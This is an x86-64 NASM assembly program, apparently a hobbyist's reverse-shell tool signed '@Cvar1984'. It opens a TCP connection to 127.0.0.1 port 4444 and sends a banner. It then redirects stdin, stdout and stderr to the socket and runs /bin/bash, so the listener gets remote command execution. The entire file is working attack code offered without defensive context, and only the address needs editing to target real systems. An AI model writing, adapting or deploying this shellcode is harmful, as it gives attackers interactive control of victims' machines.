BITS 64
section .bss

    input resb 256

    struc _socket_struct    ; define structure
        sin_family: resw 1
        sin_port: resw 1
        sin_addr: resd 1
    endstruc

section .rodata
    sys_write equ 0x1
    sys_socket equ 0x29
    sys_socket_connect equ 0x2A
    sys_execve equ 59
    fd_socket equ 0x3
    fd_stdout equ 0x1
 
    msg db '@Cvar1984'
    msg_len equ $-msg
    msg_bar times 10 db '*'
    msg_bar_len equ $-msg_bar
    error db `\e[1;31minitialization Error.\e[0m`, 10, 0
    error_len equ $-error
    error2 db `\e[1;31mConnection refused.\e[0m`, 10, 0
    error2_len equ $-error2
    shell_bin_sh db "/bin/bash", 0

    _struct_socket:
    istruc _socket_struct
        at sin_family, dw 0x2   ; AF_INET
        at sin_port, dw 0x5c11  ; port 4444
        at sin_addr, dd 0x100007f   ; ip adress 127.0.0.1
    iend

section .text

    global _start

_start:
    jmp _socket

_socket:
    mov rax, sys_socket   ; use socket syscall
    mov rdi, 0x2    ; use AF_INET
    mov rsi, 0x1    ; use SOCK_STREAM
    mov rdx, 0x6    ; use IPPROTO_TCP
    syscall

    cmp rax, 3  ; compare rax and 3
    jne _error_socket   ; if not equal = error
    jmp _connect

_error_socket:      ; write error socket
    mov rax, sys_write
    mov rdi, 0x1
    mov rsi, error  
    mov rdx, error_len
    syscall
    
    jmp _exit

_connect:
    mov rax, sys_socket_connect
    mov rdi, 0x3    ; put file descriptor in rdi
    mov rsi, _struct_socket     ; put structure socket in rsi
    mov rdx, 0x10   ; put len in rdx
    syscall
    
    cmp rax, 0xffffffffffffff91 ; compare rax and -1
    je _error_connect   ; if equal = error
    jmp _write      ; else write

_error_connect:     ; write error connection
    mov rax, sys_write
    mov rdi, fd_stdout
    mov rsi, error2
    mov rdx, error2_len
    syscall
    
    jmp _exit

_write:             ; Welcome Message
    mov rax, sys_write
    mov rdi, fd_socket
    mov rsi, msg_bar
    mov rdx, msg_bar_len
    syscall

    mov rax, sys_write
    mov rdi, fd_socket
    mov rsi, msg
    mov rdx, msg_len
    syscall

    mov rax, sys_write
    mov rdi, fd_socket
    mov rsi, msg_bar
    mov rdx, msg_bar_len
    syscall

    jmp _dupfiledescriptor

_dupfiledescriptor:     ; duplicate file descriptor
    mov rax, 33         
    mov rdi, 0x3       
    mov rsi, 0x0       
    xor rdx, rdx       
    syscall

    mov rax, 33         ; use dufd syscall
    mov rdi, 0x3        ; old fd
    mov rsi, 0x1        ; new fd
    xor rdx, rdx
    syscall
    
    mov rax, 33
    mov rdi, 0x3
    mov rsi, 0x2
    xor rdx, rdx
    syscall
    
    jmp _shell_spawn

_shell_spawn:                   ; shell spawning
    mov rax, sys_execve
    mov rdi, shell_bin_sh       ; /bin/sh
    xor rsi, rsi                ; Null  
    xor rdx, rdx                ; Null
    syscall
    
    jmp _exit

_exit:
    mov rax, 0x3C
    mov rdi, 0x0
    syscall
